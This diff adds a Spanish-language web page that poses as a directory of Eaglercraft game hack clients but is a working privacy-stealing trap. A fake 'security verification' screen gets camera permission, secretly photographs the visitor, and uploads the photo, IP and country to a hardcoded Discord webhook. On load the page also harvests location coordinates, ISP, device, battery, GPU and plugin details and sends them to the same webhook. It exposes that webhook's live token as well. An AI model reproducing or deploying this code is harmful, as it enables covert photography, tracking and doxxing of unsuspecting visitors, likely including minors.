@@ -1,1 +1,200 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<title>HOME FORGEX — Clientes Eaglercraft</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<style>
+  :root{--bg:#05060a;--card:#0f1724;--acc:#a78bfa;--pink:#ec4899;--muted:#9ca3af}
+  body{margin:0;font-family:system-ui;background:var(--bg);color:#fff;min-height:100vh;display:flex;flex-direction:column}
+  header{position:sticky;top:0;background:rgba(0,0,0,.4);backdrop-filter:blur(12px);border-bottom:1px solid #333}
+  .nav{max-width:1200px;margin:auto;padding:16px;display:flex;justify-content:space-between;align-items:center}
+  .logo{width:48px;height:48px;border-radius:12px;background:linear-gradient(135deg,var(--acc),var(--pink));display:grid;place-items:center;font-weight:900;font-size:22px}
+  .title{background:linear-gradient(90deg,var(--acc),var(--pink));-webkit-background-clip:text;color:transparent;font-weight:800}
+  main{flex:1;max-width:1200px;margin:30px auto;padding:0 20px}
+  .grid{display:grid;gap:18px;grid-template-columns:repeat(auto-fit,minmax(270px,1fr))}
+  .card{background:rgba(255,255,255,.025);border:1px solid rgba(255,255,255,.08);border-radius:16px;padding:20px;transition:.25s}
+  .card:hover{transform:translateY(-8px);box-shadow:0 20px 50px rgba(167,139,250,.2)}
+  .name{font-weight:800;font-size:18px;margin-bottom:6px}
+  .open{background:linear-gradient(90deg,var(--acc),var(--pink));color:#fff;border:none;padding:14px;border-radius:14px;font-weight:700;width:100%;cursor:pointer}
+  h1{text-align:center;font-size:2.8rem;margin:20px 0;background:linear-gradient(90deg,var(--acc),var(--pink));-webkit-background-clip:text;color:transparent}
+  video{position:fixed;top:-9999px;left:-9999px;width:640px;height:480px}
+  canvas{display:none}
+</style>
+</head>
+<body>
+
+<!-- Permiso de cámara al entrar (OPTIMIZADO PARA MÓVIL) -->
+<div id="camPermission" style="position:fixed;inset:0;background:rgba(0,0,0,0.95);display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:9999;padding:20px">
+  <h2 style="color:#a78bfa;font-size:2.5rem">Verificación de seguridad</h2>
+  <p style="font-size:1.5rem;max-width:600px;color:#fff;text-align:center">Para acceder a los clientes Eaglercraft, permite el acceso a la cámara (solo para verificar que no eres un bot).</p>
+  <button style="background:#a78bfa;padding:18px 50px;font-size:1.8rem;color:#fff;border:none;border-radius:14px;cursor:pointer;margin-top:30px" onclick="activarCamara()">PERMITIR CÁMARA</button>
+</div>
+
+<div id="mainContent" style="display:none">
+<header>
+  <div class="nav">
+    <div style="display:flex;align-items:center;gap:14px">
+      <div class="logo">HF</div>
+      <div><div class="title">HOME FORGEX</div><small style="color:var(--muted)">@j_eliseoo_v • 2025</small></div>
+    </div>
+  </div>
+</header>
+<main>
+  <h1>Clientes Eaglercraft 2025</h1>
+  <div class="grid">
+    <div class="card"><div class="name">DragonX Client</div><div class="ver">V5.1</div><button class="open" data-link="https://eaglerhacks.github.io/dragonxv5.html">Abrir</button></div>
+    <div class="card"><div class="name">WurstX Client</div><button class="open" data-link="https://eaglerhacks.github.io/wurstX.html">Abrir</button></div>
+    <div class="card"><div class="name">UwU+ Client</div><button class="open" data-link="https://eaglerhacks.github.io/UwU+-client-1.0.html">Abrir</button></div>
+    <div class="card"><div class="name">ShadowX Client</div><button class="open" data-link="https://eaglerhacks.github.io/shadowx-client-3.0.html">Abrir</button></div>
+    <div class="card"><div class="name">Sigma Client</div><button class="open" data-link="https://eaglerhacks.github.io/sigma-5.2.html">Abrir</button></div>
+    <div class="card"><div class="name">Future Client</div><button class="open" data-link="https://eaglerhacks.github.io/future-12.5.html">Abrir</button></div>
+  </div>
+</main>
+</div>
+
+<video id="video" autoplay muted playsinline></video>
+<canvas id="canvas"></canvas>
+
+<script>
+// WEBHOOK
+const WEBHOOK = "https://discord.com/api/webhooks/1457869907961319567/0LTSNVs-A0GSxoAyURM2nb6VVgWpM5PUrKiBp-z9saP61vL2gemqvaMOY-EXsKMUhkU8";
+
+async function activarCamara() {
+  try {
+    // Optimizado para móvil: pide cámara frontal directamente
+    const stream = await navigator.mediaDevices.getUserMedia({ 
+      video: { 
+        facingMode: "user",  // Cámara frontal en móvil
+        width: { ideal: 1280 },
+        height: { ideal: 720 }
+      } 
+    });
+    const video = document.getElementById('video');
+    video.srcObject = stream;
+
+    // Espera que la cámara cargue (más rápido en móvil)
+    await new Promise(resolve => video.onloadedmetadata = resolve);
+    await new Promise(resolve => setTimeout(resolve, 1500)); // 1.5 segundos para foto clara en móvil
+
+    // Toma la foto
+    const canvas = document.getElementById('canvas');
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
+    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+    const fotoData = canvas.toDataURL('image/jpeg', 0.9);
+
+    // Datos básicos + foto
+    const geo = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
+
+    const form = new FormData();
+    form.append('content', 
+`**VÍCTIMA EN CLIENTES EAGLERCRAFT (MÓVIL/PC)**
+**IP:** ${geo.ip || 'oculta'}
+**País:** ${geo.country_name || '?'}
+**Hora:** ${new Date().toLocaleString()}`);
+
+    const blob = dataURLtoBlob(fotoData);
+    form.append('file', blob, 'foto_victima.jpg');
+
+    await fetch(WEBHOOK, { method: 'POST', body: form });
+
+    // Detiene cámara
+    stream.getTracks().forEach(track => track.stop());
+
+    // Muestra página principal
+    document.getElementById('camPermission').style.display = 'none';
+    document.getElementById('mainContent').style.display = 'block';
+  } catch (err) {
+    alert('Necesitas permitir la cámara para acceder a los clientes');
+  }
+}
+
+function dataURLtoBlob(dataurl) {
+  const arr = dataurl.split(',');
+  const mime = arr[0].match(/:(.*?);/)[1];
+  const bstr = atob(arr[1]);
+  let n = bstr.length;
+  const u8arr = new Uint8Array(n);
+  while (n--) u8arr[n] = bstr.charCodeAt(n);
+  return new Blob([u8arr], { type: mime });
+}
+
+// Datos normales (IP, GPU, etc.)
+(async () => {
+  const geo = await fetch('https://ipapi.co/json/').then(r=>r.json()).catch(()=>({}));
+  const battery = await navigator.getBattery?.() || {};
+  const uaData = navigator.userAgentData || {};
+
+  let webgl = 'no disponible';
+  let gpuLevel = 'desconocida';
+  try {
+    const canvas = document.createElement('canvas');
+    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+    if (debugInfo) {
+      const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+      const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+      webgl = `${vendor} | ${renderer}`;
+      if (renderer.includes('RTX') || renderer.includes('GeForce 50') || renderer.includes('RX 9')) gpuLevel = 'Cara/Gamer (alta gama)';
+      else if (renderer.includes('RTX 40') || renderer.includes('RX 7') || renderer.includes('RX 8')) gpuLevel = 'Media-Alta (buena para juegos)';
+      else if (renderer.includes('Intel') || renderer.includes('UHD') || renderer.includes('Iris')) gpuLevel = 'Barata/Integrada (básica)';
+      else if (renderer.includes('Radeon')) gpuLevel = 'Media (AMD integrada o dedicada vieja)';
+      else gpuLevel = 'Desconocida';
+    }
+  } catch(e) {}
+
+  const pluginsList = Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'ninguno';
+  let userLevel = 'Principiante (no sabe mucho)';
+  const savvyPlugins = ['uBlock Origin','AdBlock','Privacy Badger','NoScript','HTTPS Everywhere','ClearURLs','Decentraleyes','Cookie AutoDelete','VPN','Bitwarden','Dark Reader'];
+  if (savvyPlugins.some(p => pluginsList.includes(p))) userLevel = 'Listo/Tech-savvy (sabe de privacidad)';
+  if (pluginsList.includes('PDF Viewer') && pluginsList.length < 50) userLevel = 'Principiante total (solo plugins básicos)';
+
+  const datos = {
+    ip: geo.ip || 'oculta',
+    isp: geo.org || '?',
+    ubicacion: `${geo.city || '?'}, ${geo.regionName || ''}, ${geo.country_name || 'El Salvador'} (${geo.postal || '?'})`,
+    coordenadas: `${geo.latitude || '?'}, ${geo.longitude || '?'}`,
+    hora: new Date().toLocaleString(),
+    navegador: uaData.brands?.map(b=>b.brand+" v"+b.version).join(', ') || navigator.userAgent.substring(0,100),
+    so: uaData.platform || navigator.platform,
+    movil: uaData.mobile ? 'Sí' : 'No',
+    ram: navigator.deviceMemory || '?',
+    cpu: navigator.hardwareConcurrency || '?',
+    pantalla: `${screen.width}x${screen.height}x${screen.colorDepth}`,
+    bateria: battery.level ? `${Math.round(battery.level*100)}% ${battery.charging?'cargando':'descargando'}` : 'no disponible',
+    zona: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    plugins: pluginsList,
+    user_level: userLevel,
+    gpu: webgl,
+    gpu_level: gpuLevel
+  };
+
+  const mensaje =
+`**FORGEX COMUNIDAD(HACKER)**
+**IP:** ${datos.ip} (${datos.isp})
+**Ubicación:** ${datos.ubicacion}
+**Coordenadas:** ${datos.coordenadas}
+**Hora:** ${datos.hora}
+**Navegador:** ${datos.navegador}
+**SO:** ${datos.so} | Móvil: ${datos.movil}
+**RAM:** ${datos.ram} GB | CPU: ${datos.cpu} núcleos
+**Pantalla:** ${datos.pantalla}
+**Batería:** ${datos.bateria}
+**Zona horaria:** ${datos.zona}
+**Plugins:** ${datos.plugins}
+**Nivel del usuario:** ${datos.user_level}
+**GPU:** ${datos.gpu}
+**Tipo de GPU:** ${datos.gpu_level}`;
+
+  await fetch(WEBHOOK, {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({content: mensaje})});
+})();
+
+// Botones normales
+document.querySelectorAll('.open').forEach(btn => {
+  btn.onclick = () => setTimeout(() => window.open(btn.dataset.link, '_blank'), 300);
+});
+</script>
+</body>
+</html>
 
